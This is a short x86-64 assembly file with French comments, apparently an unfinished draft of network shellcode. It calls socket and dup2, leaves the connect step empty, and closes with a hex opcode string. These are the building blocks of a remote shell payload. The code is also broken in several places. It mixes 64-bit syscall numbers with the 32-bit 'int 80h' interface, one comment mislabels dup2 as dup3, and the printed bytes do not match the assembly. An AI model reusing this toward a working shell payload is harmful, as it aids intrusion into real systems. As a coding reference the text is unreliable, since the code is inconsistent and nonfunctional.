; Shellcode ASM
BITS 64
section .text
global _start
_start:

;Nettoie les registres dont on aura besoin (rax, rbx, rcx, rdx)
    xor rax, rax
    sub rax, rax
    shr rax, 16
    xor rbx, rbx
    sub rbx, rbx
    shr rbx, 16
    xor rcx, rcx
    sub rcx, rcx
    shr rcx, 16
    xor rdx, rdx
    sub rdx, rdx
    shr rdx, 16
    ;appel système de socket
    push 0x01
    push 0x02
    mov al, 0x29  ;Définit l'appel systeme utilisé (sys_socket = 41 en décimal = 0x29)
    pop di  
    pop si
    int 80h

dup2:
  dec ecx
  mov al, 63 ; syscall dup3 ( file descriptor)
  int 80h
  ;dec ecx
  jnz dup2

    ;appel système de connect
    mov rsi, rax ; sauvegarde du socket
    ;push 

; on quitte proprement
exit:
    xor rdi, rdi
    xor rax, rax
    mov al,  0x3c               ; syscall de exit
    syscall

; SOCKET
; 41    sys_socket    int family    int type    int protocol
;                       (on veut ip_v4) (on veut TCP)
; %rax    System call    %rdi            %rsi            %rdx




;#for i in $(objdump -D a.out |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x6a\x01\x6a\x02\xb0\x29\x66\x5f\x66\x5e\xcd\x80\x48\x31\xff\x48\x31\xc0\xb0\x3c\x0f\x05
